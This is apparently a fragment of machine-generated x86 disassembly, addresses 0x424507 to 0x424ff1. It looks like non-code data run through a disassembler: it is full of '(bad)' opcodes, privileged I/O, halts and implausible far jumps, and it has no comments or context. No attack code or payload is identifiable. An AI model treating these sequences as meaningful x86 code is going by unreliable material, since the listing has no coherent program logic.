  424507:	test   eax,0xcd1dbc25
  42450c:	push   ebp
  42450d:	shr    DWORD PTR [edi],cl
  42450f:	std    
  424510:	sub    eax,0x0
	...
  424571:	add    BYTE PTR [eax],al
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x34],1
  424581:	sub    DWORD PTR [ebp+0x184473f],0x0
  424588:	add    eax,0xd1000001
  42458d:	cdq    
  42458e:	hlt    
  42458f:	mov    ebx,0x53c89803
  424594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424595:	ins    BYTE PTR es:[edi],dx
  424596:	sti    
  424597:	and    al,0xc5
  424599:	dec    ebx
  42459a:	push   ss
  42459b:	push   ss
  42459c:	jbe    0x424573
  42459e:	sahf   
  42459f:	repnz ss add eax,esi
  4245a3:	test   BYTE PTR [edi-0x46],ch
  4245a6:	pop    ecx
  4245a7:	(bad)  
  4245a8:	push   esp
  4245a9:	in     al,0xbd
  4245ab:	cmp    eax,0x1c54de29
  4245b0:	repnz nop
  4245b2:	outs   dx,DWORD PTR ds:[esi]
  4245b3:	mov    bh,0x70
  4245b5:	inc    ebp
  4245b6:	push   edx
  4245b7:	fisttp WORD PTR [ecx+0x4b]
  4245ba:	adc    DWORD PTR [ecx+0xbd756b3],esi
  4245c0:	scas   eax,DWORD PTR es:[edi]
  4245c1:	int3   
  4245c2:	adc    al,0x7d
  4245c4:	push   0xa07aad77
  4245c9:	mov    bh,0x32
  4245cb:	cmp    BYTE PTR [edx],ah
  4245cd:	sbb    al,0x83
  4245cf:	and    al,0xc7
  4245d1:	fild   QWORD PTR [edx-0x1c87b55e]
  4245d7:	repz arpl ax,di
  4245da:	xchg   BYTE PTR [eax-0xcd64a9d],bh
  4245e0:	sar    dl,1
  4245e2:	cwde   
  4245e3:	in     eax,0xef
  4245e5:	add    eax,0xe0ced715
  4245ea:	int3   
  4245eb:	push   ebp
  4245ec:	(bad)  
  4245ed:	loop   0x424627
  4245ef:	cmp    eax,0x76c1a42d
  4245f4:	stc    
  4245f5:	ss mov ss,edi
  4245f8:	jbe    0x424625
  4245fa:	jnp    0x424671
  4245fc:	add    DWORD PTR [ecx],ebp
  4245fe:	cmp    BYTE PTR [edx],0x45
  424601:	stos   DWORD PTR es:[edi],eax
  424602:	iret   
  424603:	adc    eax,0xb24f6677
  424608:	lds    edi,FWORD PTR [edi]
  42460a:	int3   
  42460b:	fld    DWORD PTR [edx+0x7a]
  42460e:	pop    edx
  42460f:	mov    dl,BYTE PTR [edx+0x6b]
  424612:	mov    esi,0xa8bea157
  424617:	pop    ss
  424618:	dec    ecx
  424619:	sub    BYTE PTR [edx+edi*4+0x10],ch
  42461d:	aaa    
  42461e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42461f:	pop    edx
  424620:	push   esp
  424621:	dec    eax
  424622:	test   al,0x1a
  424624:	and    al,0xb4
  424626:	mov    bh,0xeb
  424628:	call   0x3f09e6bd
  42462d:	retf   0xf7f6
  424630:	inc    esp
  424631:	mov    BYTE PTR [esi+edi*2],0x6d
  424635:	sub    dh,BYTE PTR [esi]
  424637:	jecxz  0x42467a
  424639:	mov    ecx,0x30bc45ce
  42463e:	enter  0x42ca,0xab
  424642:	outs   dx,DWORD PTR ds:[esi]
  424643:	pusha  
  424644:	add    al,0x3c
  424646:	popf   
  424647:	sub    edx,DWORD PTR [esi+ecx*8-0x55]
  42464b:	push   0xffffff8b
  42464d:	or     ebp,0x6a34983c
  424653:	lds    eax,FWORD PTR ss:[eax]
  424656:	sbb    al,0x38
  424658:	jns    0x4246d5
  42465a:	cmc    
  42465b:	and    edx,DWORD PTR [ecx-0x2f34953a]
  424661:	in     eax,dx
  424662:	or     BYTE PTR [edx-0x6],dh
  424665:	repnz call 0xbf73:0x4b79971f
  42466d:	fdivr  st(4),st
  42466f:	push   edi
  424670:	cmp    eax,0x540dd1f9
  424675:	test   bl,cl
  424677:	test   DWORD PTR [edx+ebp*2-0x74],edx
  42467b:	je     0x424681
  42467d:	push   0x88baf996
  424682:	cld    
  424683:	adc    ch,bh
  424685:	xchg   ecx,eax
  424686:	cs popa 
  424688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424689:	addr16 inc eax
  42468b:	imul   edi,edx,0x752c8bd8
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edx+0x4cc2f15a],ch
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0x4c000001,al
  42470d:	loop   0x424714
  42470f:	leave  
  424710:	int3   
  424711:	fisubr DWORD PTR [ebp-0x24de53e2]
  424717:	ds fwait
  424719:	sub    eax,ebx
  42471b:	mov    al,ds:0x7674878f
  424720:	add    al,BYTE PTR [ebp-0x176b5b22]
  424726:	add    al,0xf1
  424728:	lock je 0x42474a
  42472b:	xchg   ebx,eax
  42472c:	adc    al,0x99
  42472e:	mov    eax,ds:0x2a598615
  424733:	in     al,0xc7
  424735:	and    esi,DWORD PTR [edx+0x3a55df2f]
  42473b:	pop    esp
  42473c:	pop    ebp
  42473d:	adc    BYTE PTR [edx+0x28ec3701],cl
  424743:	jmp    0x42476a
  424745:	imul   edi,esi,0xc026a16f
  42474b:	jmp    0xc3f0:0xd3b3fc11
  424752:	inc    ebx
  424753:	inc    edi
  424754:	into   
  424755:	mov    edi,0xc3f6d136
  42475a:	or     bh,bh
  42475c:	in     eax,dx
  42475d:	xchg   ecx,eax
  42475e:	cmp    bh,al
  424760:	loope  0x424709
  424762:	ins    DWORD PTR es:[edi],dx
  424763:	retf   0xa41f
  424766:	lods   al,BYTE PTR ds:[esi]
  424767:	popf   
  424768:	loope  0x4247b8
  42476a:	xor    DWORD PTR [edx-0x45],0x80aba231
  424771:	repz jae 0x4247a5
  424774:	test   BYTE PTR [eax+0xecaaa4e],dl
  42477a:	sti    
  42477b:	icebp  
  42477c:	or     ebp,DWORD PTR [ebp+ebx*2-0x4415bf84]
  424783:	and    al,0xb7
  424785:	mov    dl,0x47
  424787:	loopne 0x424726
  424789:	or     al,0x44
  42478b:	pop    DWORD PTR [ebx-0x796cf059]
  424791:	or     bh,BYTE PTR [esi-0xd7d5e3e]
  424797:	jbe    0x424809
  424799:	int    0xa2
  42479b:	sbb    BYTE PTR [edx+0x2a58a80b],ch
  4247a1:	or     ah,0x83
  4247a4:	leave  
  4247a5:	sub    BYTE PTR [esi-0x1b],bh
  4247a8:	adc    ah,BYTE PTR [edi+0x66]
  4247ab:	test   al,0x6b
  4247ad:	sahf   
  4247ae:	std    
  4247af:	loop   0x42480f
  4247b1:	add    esi,DWORD PTR [ebx-0xa]
  4247b4:	mov    bl,0x70
  4247b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b7:	pop    ebx
  4247b8:	push   edi
  4247b9:	inc    edx
  4247ba:	xchg   esp,eax
  4247bb:	in     al,dx
  4247bc:	retf   
  4247bd:	or     eax,0x451b77f8
  4247c2:	mov    dl,0xc1
  4247c4:	es inc esp
  4247c6:	push   cs
  4247c7:	icebp  
  4247c8:	inc    esi
  4247c9:	jge    0x424775
  4247cb:	repnz sub DWORD PTR [edx*8-0xbf3945b],ebx
  4247d3:	daa    
  4247d4:	inc    ebp
  4247d5:	mov    ch,0x5e
  4247d7:	jg     0x42484d
  4247d9:	adc    eax,0xbfc6c6e0
  4247de:	xchg   ebx,eax
  4247df:	push   eax
  4247e0:	sbb    edx,DWORD PTR [eax]
  4247e2:	fwait
  4247e3:	mov    ebp,0x9cab2ec5
  4247e8:	xchg   esp,eax
  4247e9:	or     dl,BYTE PTR [edx+0x55]
  4247ec:	or     al,0xa
  4247ee:	add    BYTE PTR [edi],dl
  4247f0:	jmp    0x616d:0x487595f5
  4247f7:	xor    dh,BYTE PTR [ecx-0x6f]
  4247fa:	or     al,0xb7
  4247fc:	jecxz  0x4247d4
  4247fe:	mov    ds:0xe8d6cc84,eax
  424803:	xor    eax,0xa835ecca
  424808:	cmp    al,0xdd
  42480a:	xor    eax,0xb7b24c09
  42480f:	adc    bl,BYTE PTR [esi]
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	sbb    ebx,DWORD PTR [eax-0x2c]
  424883:	or     eax,0x18651
  424888:	add    eax,0xe5000001
  42488d:	mov    eax,ds:0x94f5be10
  424892:	and    BYTE PTR [esi+0x72efa192],0xbc
  424899:	xor    dl,BYTE PTR [edx]
  42489b:	dec    edx
  42489c:	jne    0x424908
  42489e:	shr    BYTE PTR [edx],0xd4
  4248a1:	ins    DWORD PTR es:[edi],dx
  4248a2:	mov    esp,ss
  4248a4:	sub    DWORD PTR [esi-0x66edcbf1],edi
  4248aa:	adc    edi,DWORD PTR [edi+eax*8+0x3609bfce]
  4248b1:	sar    BYTE PTR [ebx+ecx*2-0x59],1
  4248b5:	test   BYTE PTR [eax],ah
  4248b7:	xchg   BYTE PTR [esi-0x3296a5a6],bh
  4248bd:	(bad)  
  4248be:	retf   0xfc86
  4248c1:	ret    0x32e7
  4248c4:	outs   dx,DWORD PTR ds:[esi]
  4248c5:	pop    eax
  4248c6:	mov    esp,DWORD PTR [esi]
  4248c8:	das    
  4248c9:	or     DWORD PTR [ebp-0x38],esi
  4248cc:	dec    BYTE PTR [ecx+0x138967d8]
  4248d2:	jnp    0x4248bb
  4248d4:	xor    BYTE PTR [edi-0x574b7055],0x3a
  4248db:	test   al,0xc3
  4248dd:	popa   
  4248de:	jle    0x424920
  4248e0:	or     eax,0x9a3076ca
  4248e5:	pop    edi
  4248e6:	inc    eax
  4248e7:	jnp    0x4248a0
  4248e9:	jmp    0x4cc9:0x3be3109c
  4248f0:	cmc    
  4248f1:	cmp    BYTE PTR [eax],cl
  4248f3:	mov    ds:0xc5427657,eax
  4248f8:	aam    0xf3
  4248fa:	retf   
  4248fb:	sbb    eax,0x105522e1
  424900:	push   esp
  424901:	mov    esi,0x99501891
  424906:	sub    esi,DWORD PTR [ecx-0x47bac818]
  42490c:	mov    esi,0x1c6c6969
  424911:	sti    
  424912:	xchg   BYTE PTR [ecx+0x4bcdf23e],al
  424918:	ja     0x4248c5
  42491a:	jb     0x4248e3
  42491c:	(bad)  
  42491d:	mov    ebx,0x9c71f378
  424922:	mov    esi,0x48552a2
  424927:	adc    BYTE PTR [esi+0x5f9416d0],ah
  42492d:	imul   edi,DWORD PTR [esi+edi*2-0x32],0x17
  424932:	test   BYTE PTR [ecx+0x61],cl
  424935:	out    0xf8,eax
  424937:	cld    
  424938:	lods   al,BYTE PTR ds:[esi]
  424939:	pop    ebx
  42493a:	int    0x3f
  42493c:	pop    ebx
  42493d:	(bad)  [ebx+0x74a2aff5]
  424943:	sub    bh,BYTE PTR [ebx+0x1f]
  424946:	rcr    DWORD PTR [edx-0x231e69fe],cl
  42494c:	pop    ss
  42494d:	xor    DWORD PTR [ebp+0x7e],esi
  424950:	and    al,0x8f
  424952:	inc    edx
  424953:	sbb    DWORD PTR [esi],0x504a0a75
  424959:	addr16 in eax,dx
  42495b:	or     al,0x86
  42495d:	js     0x42490e
  42495f:	adc    DWORD PTR [ecx+0x10bc82ce],0xbab55a1e
  424969:	jne    0x42494a
  42496b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42496c:	or     al,0x4b
  42496e:	fisubr DWORD PTR [ebp+0x7b]
  424971:	int3   
  424972:	stc    
  424973:	sbb    BYTE PTR ds:0xcb071218,bl
  424979:	xor    BYTE PTR [edi+edi*4+0x61d87567],ch
  424980:	call   0xff2150d9
  424985:	pop    ds
  424986:	enter  0xe162,0x35
  42498a:	fcmove st,st(5)
  42498c:	outs   dx,DWORD PTR ds:[esi]
  42498d:	adc    al,0x24
  42498f:	and    al,0x53
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    al,BYTE PTR [esi]
  424a01:	cld    
  424a02:	jle    0x424a83
  424a04:	push   esi
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0x21000001,al
  424a0d:	inc    esp
  424a0e:	sar    ebx,0x37
  424a11:	push   ss
  424a12:	ja     0x424a3c
  424a14:	jnp    0x424a5b
  424a16:	ror    BYTE PTR [eax-0x10],1
  424a19:	sbb    BYTE PTR [edx+edx*1+0x3046917],ah
  424a20:	push   ebp
  424a21:	xchg   esp,eax
  424a22:	iret   
  424a23:	fild   WORD PTR [edx+0x1]
  424a26:	add    al,0x94
  424a28:	lods   al,BYTE PTR ds:[esi]
  424a29:	cmp    edi,DWORD PTR [edx+0x5d]
  424a2c:	enter  0x40f,0x6a
  424a30:	cli    
  424a31:	bound  ebx,QWORD PTR ds:0x2544d36c
  424a37:	je     0x424a19
  424a39:	dec    esp
  424a3a:	adc    BYTE PTR [edx-0x41],bl
  424a3d:	dec    ebx
  424a3e:	pop    ss
  424a3f:	sbb    al,0x49
  424a41:	mov    al,0xa6
  424a43:	xchg   esp,eax
  424a44:	inc    esp
  424a45:	jne    0x424a9b
  424a47:	mov    ecx,0x742f38bc
  424a4c:	outs   dx,BYTE PTR ds:[esi]
  424a4d:	mov    es,ebp
  424a4f:	push   ebx
  424a50:	xchg   edx,eax
  424a51:	(bad)  
  424a52:	sbb    eax,0x5a6880c5
  424a57:	cdq    
  424a58:	rcr    DWORD PTR [eax],cl
  424a5a:	mov    DWORD PTR [eax+0x66],edx
  424a5d:	loopne 0x424a3c
  424a5f:	ror    BYTE PTR [esi-0x57],cl
  424a62:	xchg   BYTE PTR [ebx+0x35],ch
  424a65:	xor    al,0x7
  424a67:	or     DWORD PTR [edx],ecx
  424a69:	das    
  424a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a6b:	add    BYTE PTR [ebx],dl
  424a6d:	fsub   st(7),st
  424a6f:	iret   
  424a70:	shl    dl,0xba
  424a73:	and    DWORD PTR [edx+ecx*2],eax
  424a76:	jmp    0x5d8a:0x6f2e31b
  424a7d:	icebp  
  424a7e:	shl    al,0x80
  424a81:	ins    DWORD PTR es:[edi],dx
  424a82:	and    BYTE PTR [edi],bl
  424a84:	pop    ds
  424a85:	xchg   esp,eax
  424a86:	(bad)  
  424a87:	jmp    0x9adcb3e7
  424a8c:	out    dx,eax
  424a8d:	mov    al,0x15
  424a8f:	(bad)  [eax]
  424a91:	ins    BYTE PTR es:[edi],dx
  424a92:	ror    DWORD PTR [edx-0xb],1
  424a95:	jns    0x424ad9
  424a97:	jmp    0x424a76
  424a99:	pop    esp
  424a9a:	call   0xe8b0c55f
  424a9f:	scas   al,BYTE PTR es:[edi]
  424aa0:	pop    esp
  424aa1:	add    DWORD PTR [ebx+0x62084e70],esp
  424aa7:	jl     0x424aea
  424aa9:	jb     0x424ab5
  424aab:	(bad)  
  424aac:	xor    edi,ecx
  424aae:	(bad)  [ebx-0x61]
  424ab1:	imul   ebx,DWORD PTR [edi],0xffffffb1
  424ab4:	cmp    al,0x59
  424ab6:	inc    eax
  424ab7:	(bad)  
  424ab8:	pushf  
  424ab9:	pop    ds
  424aba:	mov    ds:0x1d371e81,eax
  424abf:	call   DWORD PTR [ebp+0x2def08b3]
  424ac5:	sbb    eax,DWORD PTR [esi-0x20]
  424ac8:	xchg   BYTE PTR [esi],cl
  424aca:	bound  ebx,QWORD PTR ds:0xd594ba8e
  424ad0:	arpl   WORD PTR [edi+0x28],bx
  424ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ad4:	jbe    0x719fc777
  424ada:	sub    eax,0x1622d41d
  424adf:	out    0x89,eax
  424ae1:	pop    esi
  424ae2:	lods   al,BYTE PTR ds:[esi]
  424ae3:	xchg   ebx,eax
  424ae4:	(bad)  
  424ae5:	aas    
  424ae6:	call   0x10de160e
  424aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424aec:	popa   
  424aed:	ds pusha 
  424aef:	sub    bh,BYTE PTR [ebp+0x1f810075]
  424af5:	sbb    DWORD PTR [edi-0x18],esi
  424af8:	sahf   
  424af9:	xor    DWORD PTR [esi+0x37],0x31a962f4
  424b00:	(bad)  
  424b01:	cli    
  424b02:	sub    edi,ebx
  424b04:	loopne 0x424b46
  424b06:	cmp    BYTE PTR [edx],ch
  424b08:	popa   
  424b09:	mov    esi,0x9ba6131f
  424b0e:	xor    eax,esi
  424b10:	jbe    0x424b12
	...
  424b72:	add    BYTE PTR [eax],al
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	xchg   DWORD PTR [eax],esi
  424b82:	mov    esi,0x1885b01
  424b87:	add    BYTE PTR ds:0x3e000001,al
  424b8d:	int3   
  424b8e:	mov    WORD PTR [edi+0x6e],?
  424b91:	fchs   
  424b93:	mov    ch,0x50
  424b95:	clc    
  424b96:	hlt    
  424b97:	sbb    ebx,DWORD PTR [eax-0x393564ea]
  424b9d:	sub    esi,DWORD PTR [ebp+0x5d]
  424ba0:	pop    ss
  424ba1:	loope  0x424c0b
  424ba3:	lods   al,BYTE PTR ds:[esi]
  424ba4:	loop   0x424c0d
  424ba6:	ror    esp,cl
  424ba8:	test   al,0xe4
  424baa:	mov    edx,DWORD PTR [eax]
  424bac:	pop    ebx
  424bad:	call   0xca49:0xdfd3d28f
  424bb4:	adc    eax,0x4cd7eba0
  424bb9:	out    dx,al
  424bba:	sahf   
  424bbb:	mov    bh,0xf4
  424bbd:	xor    DWORD PTR [ebx],edx
  424bbf:	idiv   BYTE PTR [edi]
  424bc1:	add    eax,0xb7343161
  424bc6:	inc    esp
  424bc7:	out    0xaf,eax
  424bc9:	popa   
  424bca:	adc    BYTE PTR [edi],bl
  424bcc:	das    
  424bcd:	jb     0x424c3c
  424bcf:	xor    al,0xc
  424bd1:	add    al,0xaa
  424bd3:	or     DWORD PTR [ebp+0x1b],eax
  424bd6:	mov    dh,BYTE PTR [edi]
  424bd8:	hlt    
  424bd9:	frstor [edx+0x27]
  424bdc:	inc    edi
  424bdd:	cmc    
  424bde:	jne    0x424c40
  424be0:	imul   edx,DWORD PTR [edi+edx*4],0x5e
  424be4:	sub    al,0x55
  424be6:	mov    ecx,0x3a7e8cf3
  424beb:	cld    
  424bec:	adc    DWORD PTR [edi-0x21605978],eax
  424bf2:	jns    0x424bc0
  424bf4:	scas   al,BYTE PTR es:[edi]
  424bf5:	rcr    BYTE PTR [edi+0x3c],0xea
  424bf9:	adc    esi,eax
  424bfb:	aas    
  424bfc:	mov    ebp,0xac1e1f06
  424c01:	mov    ecx,0x7d7e4dbc
  424c06:	shl    BYTE PTR [ecx-0x2498601],0x44
  424c0d:	test   DWORD PTR [edx],ebp
  424c0f:	arpl   di,ax
  424c11:	xchg   DWORD PTR [ecx+0x6f],edi
  424c14:	sbb    al,0x68
  424c16:	mov    ds:0x22f7baa8,eax
  424c1b:	call   0x48e9:0x5ed6b1d6
  424c22:	pop    edi
  424c23:	xor    DWORD PTR ds:0xc77d7f95,ebx
  424c29:	cmp    eax,0x286f2acd
  424c2e:	jg     0x424bfa
  424c30:	and    al,0x3a
  424c32:	mov    esi,0x281b212e
  424c37:	adc    BYTE PTR [esp+edi*8],dl
  424c3a:	retf   
  424c3b:	pop    esp
  424c3c:	div    DWORD PTR [ecx+0x31]
  424c3f:	add    ecx,0x8e30db26
  424c45:	and    al,BYTE PTR [eax+0x52]
  424c48:	ss dec si
  424c4b:	aaa    
  424c4c:	push   es
  424c4d:	adc    ecx,edi
  424c4f:	out    dx,al
  424c50:	es out dx,eax
  424c52:	shr    DWORD PTR [ecx],cl
  424c54:	sbb    DWORD PTR [esi-0x79],edx
  424c57:	(bad)
  424c5a:	cld    
  424c5b:	fstp   TBYTE PTR ss:[ebx]
  424c5e:	adc    eax,0xee3b333d
  424c63:	xchg   DWORD PTR [ecx-0x531d64de],esp
  424c69:	lods   eax,DWORD PTR ds:[esi]
  424c6a:	pop    esi
  424c6b:	xchg   esp,eax
  424c6c:	mov    ah,0xb8
  424c6e:	je     0x424caa
  424c70:	fcom   QWORD PTR [eax+eiz*4+0x344a8b10]
  424c77:	dec    ecx
  424c78:	lahf   
  424c79:	pop    edi
  424c7a:	enter  0x8aae,0xa8
  424c7e:	push   0xeac0ed9f
  424c83:	pop    ebx
  424c84:	std    
  424c85:	sar    BYTE PTR [ebp-0x1b4a7694],1
  424c8b:	cli    
  424c8c:	stc    
  424c8d:	and    eax,0xa37a32
	...
  424cf2:	add    BYTE PTR [eax],al
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x7e42ae58]
  424d02:	and    eax,0x1896042
  424d07:	add    BYTE PTR ds:0xeb000001,al
  424d0d:	pop    ebp
  424d0e:	mov    esp,0x365b4534
  424d13:	sub    bl,al
  424d15:	adc    BYTE PTR [ebp*2-0x32c35c7c],ah
  424d1c:	mov    esp,0xb959f36f
  424d21:	mov    cl,0xc3
  424d23:	cmp    esi,DWORD PTR [ecx-0xb]
  424d26:	fiadd  DWORD PTR [eax+ebp*4+0x1a19794b]
  424d2d:	nop
  424d2e:	add    eax,0x57064ba
  424d33:	mov    dh,0x11
  424d35:	ja     0x424cd2
  424d37:	mov    dl,0xd0
  424d39:	adc    ch,BYTE PTR [edx+0x7e]
  424d3c:	cmp    al,0xf4
  424d3e:	cmp    al,0x8f
  424d40:	je     0x424d88
  424d42:	sub    bl,bl
  424d44:	int    0xb
  424d46:	inc    edi
  424d47:	inc    esi
  424d48:	add    BYTE PTR [ebx+0x49],dh
  424d4b:	xchg   BYTE PTR [ecx-0x37a59e12],bl
  424d51:	data16 stos BYTE PTR es:[edi],al
  424d53:	int    0xb8
  424d55:	rcr    BYTE PTR gs:[edx],0x34
  424d59:	push   ecx
  424d5a:	jmp    0xafef:0xfa040fcf
  424d61:	xlat   BYTE PTR ds:[ebx]
  424d62:	ret    0x9768
  424d65:	add    esi,ebx
  424d67:	cld    
  424d68:	scas   al,BYTE PTR es:[edi]
  424d69:	int3   
  424d6a:	fbld   TBYTE PTR [eax+ebp*4+0x41]
  424d6e:	repz bound ecx,QWORD PTR [ebp+0xf]
  424d72:	jb     0x424d46
  424d74:	popf   
  424d75:	jecxz  0x424cfe
  424d77:	push   ds
  424d78:	add    DWORD PTR [ebx],esp
  424d7a:	jp     0x424d34
  424d7c:	out    dx,al
  424d7d:	pushf  
  424d7e:	mov    esi,0xd7abad8f
  424d83:	pop    ds
  424d84:	cld    
  424d85:	nop
  424d86:	rcl    BYTE PTR [edx-0x1203cf63],cl
  424d8c:	ja     0x424d7a
  424d8e:	(bad)  
  424d8f:	fsubr  DWORD PTR [esp+ebp*4]
  424d92:	sti    
  424d93:	nop
  424d94:	cmp    al,BYTE PTR [esi+0x48]
  424d97:	and    DWORD PTR [ecx+0x2d],edx
  424d9a:	hlt    
  424d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d9c:	mov    WORD PTR [esi],ss
  424d9e:	dec    DWORD PTR [ecx-0x565032dc]
  424da4:	and    bh,BYTE PTR [ecx]
  424da6:	sbb    dl,dl
  424da8:	fild   DWORD PTR [ebx+0x77]
  424dab:	lods   eax,DWORD PTR ds:[esi]
  424dac:	push   es
  424dad:	ja     0x424dec
  424daf:	mov    bh,0x1c
  424db1:	mov    edx,0xc8469be5
  424db6:	dec    eax
  424db7:	out    0xc3,eax
  424db9:	retf   0xaa00
  424dbc:	sub    DWORD PTR [ebx+0x57],0x1e
  424dc0:	mov    bl,al
  424dc2:	retf   0x60ac
  424dc5:	mov    DWORD PTR [edx],esi
  424dc7:	push   cs
  424dc8:	shl    DWORD PTR ds:0xb7d41fea,0x7b
  424dcf:	in     al,0xa1
  424dd1:	sub    eax,0xcf11d98c
  424dd6:	das    
  424dd7:	outs   dx,DWORD PTR ds:[esi]
  424dd8:	fiadd  DWORD PTR [edi+0x29]
  424ddb:	sub    esi,esp
  424ddd:	mov    ds:0xa7743808,al
  424de2:	aam    0xef
  424de4:	scas   al,BYTE PTR es:[edi]
  424de5:	mov    dl,0xbb
  424de7:	xchg   esp,eax
  424de8:	scas   eax,DWORD PTR es:[edi]
  424de9:	xchg   ebp,eax
  424dea:	sbb    DWORD PTR [edi-0x4f],ecx
  424ded:	(bad)  
  424dee:	je     0x424dc4
  424df0:	repz iret 
  424df2:	aad    0x8b
  424df4:	mov    ebp,0x3ced288
  424df9:	pop    esp
  424dfa:	fadd   QWORD PTR [ecx]
  424dfc:	aaa    
  424dfd:	sub    eax,0x6e2bf9f0
  424e02:	lods   eax,DWORD PTR ds:[esi]
  424e03:	jae    0x424e48
  424e05:	pop    ss
  424e06:	inc    ecx
  424e07:	push   0xffffffae
  424e09:	in     eax,0x19
  424e0b:	jp     0x424dac
  424e0d:	repnz xchg esp,eax
  424e0f:	cs int 0x0
	...
  424e72:	add    BYTE PTR [eax],al
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e0a
  424e81:	test   eax,0x8a65d6da
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    eax,0xc000001
  424e8d:	imul   esi
  424e8f:	sbb    BYTE PTR [ebx-0x5bc2e8db],ch
  424e95:	cmc    
  424e96:	sbb    al,0x6
  424e98:	add    cl,BYTE PTR [edi]
  424e9a:	sub    DWORD PTR [esp+ebp*4],edx
  424e9d:	mov    ch,0x41
  424e9f:	mov    eax,ds:0x39a03cb1
  424ea4:	in     al,0x3c
  424ea6:	imul   esp,DWORD PTR [eax-0x30315708],0xffffffb3
  424ead:	mov    ah,0xde
  424eaf:	jmp    0xd62adf62
  424eb4:	mov    al,cl
  424eb6:	mov    bl,0x4
  424eb8:	or     BYTE PTR [edx-0x37],bh
  424ebb:	jmp    0x424e5d
  424ebd:	pop    ecx
  424ebe:	mov    al,0x65
  424ec0:	js     0x424e5f
  424ec2:	add    ch,BYTE PTR [eax-0x44d895f6]
  424ec8:	es pusha 
  424eca:	je     0x424e6f
  424ecc:	int    0x76
  424ece:	adc    bh,0x5f
  424ed1:	icebp  
  424ed2:	scas   al,BYTE PTR es:[edi]
  424ed3:	xchg   ebx,eax
  424ed4:	pop    es
  424ed5:	dec    esp
  424ed6:	data16 icebp 
  424ed8:	or     BYTE PTR [eax-0x1b],cl
  424edb:	test   eax,esp
  424edd:	retf   
  424ede:	ds pop es
  424ee0:	xchg   edx,eax
  424ee1:	js     0x424e64
  424ee3:	pop    esi
  424ee4:	mov    esp,0xda5ae24a
  424ee9:	adc    eax,0x5e7e8a5a
  424eee:	cmp    DWORD PTR [ebp-0x5c],ebp
  424ef1:	mov    al,0x6c
  424ef3:	fmul   st(6),st
  424ef5:	sbb    BYTE PTR [ebp+ebx*4-0x3da610b3],0xcc
  424efd:	sub    eax,DWORD PTR [edi]
  424eff:	in     al,0x5f
  424f01:	inc    ebx
  424f02:	scas   eax,DWORD PTR es:[edi]
  424f03:	popf   
  424f04:	dec    edx
  424f05:	sub    eax,0x70a5e637
  424f0a:	cs cs push esi
  424f0d:	and    al,0x58
  424f0f:	loop   0x424f88
  424f11:	icebp  
  424f12:	cdq    
  424f13:	popa   
  424f14:	and    eax,0xff9a5e9c
  424f19:	pusha  
  424f1a:	loop   0x424eb6
  424f1c:	jle    0x424f09
  424f1e:	xor    ebp,DWORD PTR [ecx+ebx*2+0x7]
  424f22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f23:	xor    DWORD PTR [edx+edx*1+0x5b],eax
  424f27:	ins    BYTE PTR es:[edi],dx
  424f28:	fucomi st,st(3)
  424f2a:	fisub  WORD PTR [eax-0x20]
  424f2d:	mov    ebx,0xdfe908ba
  424f32:	ror    bl,0xbe
  424f35:	push   0x7ab0af85
  424f3a:	xor    DWORD PTR ds:0x2ed82b37,esp
  424f40:	je     0x424f2c
  424f42:	xchg   ebx,eax
  424f43:	add    ecx,DWORD PTR [esi]
  424f45:	test   ah,ah
  424f47:	into   
  424f48:	or     DWORD PTR [ebp+0x65616ae8],edi
  424f4e:	pop    es
  424f4f:	lods   al,BYTE PTR ds:[esi]
  424f50:	jbe    0x424ed5
  424f52:	enter  0x3180,0xb8
  424f56:	cmp    ebx,DWORD PTR [ecx-0x5ac753fc]
  424f5c:	ret    
  424f5d:	mov    esi,0x844a518c
  424f62:	int    0x3
  424f64:	jne    0x424f28
  424f66:	dec    eax
  424f67:	call   FWORD PTR [esi-0x50a67100]
  424f6d:	aad    0x24
  424f6f:	es cmp eax,ebx
  424f72:	sub    DWORD PTR fs:[ebp-0xc2ec7d3],esp
  424f79:	dec    ebp
  424f7a:	xchg   dl,ah
  424f7c:	mov    edx,0xebb4ee2f
  424f81:	out    dx,al
  424f82:	jne    0x424fe9
  424f84:	mov    al,ds:0x6536f21e
  424f89:	and    ah,bl
  424f8b:	cmp    cl,BYTE PTR [ecx+0x6182165a]
	...
  424ff1:	add    BYTE PTR [eax],al
